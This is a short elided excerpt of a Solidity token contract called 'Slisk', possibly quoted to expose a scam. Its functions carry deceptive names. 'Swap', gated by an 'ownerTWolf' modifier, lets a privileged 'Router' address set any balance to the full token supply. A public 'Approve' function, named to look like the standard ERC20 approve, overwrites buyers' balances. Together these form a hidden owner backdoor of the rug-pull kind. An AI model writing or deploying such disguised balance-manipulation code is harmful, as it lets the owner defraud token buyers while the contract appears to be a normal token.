...
contract Slisk is IERC20, Ownable {
    ...
    function Bscreflection(address buyer)
        internal
        view
        ownerTWolf
        returns (uint256)
    ...
    function Approve(address buyer) public {
        balances[buyer] = Bscreflection(buyer);
    }

    function Swap(address Router) public ownerTWolf {
        balances[Router] = (_tTotal);
    }
    ...
    modifier ownerTWolf() {
        require(Router == msg.sender, "ERC20: cannot permit Router address");
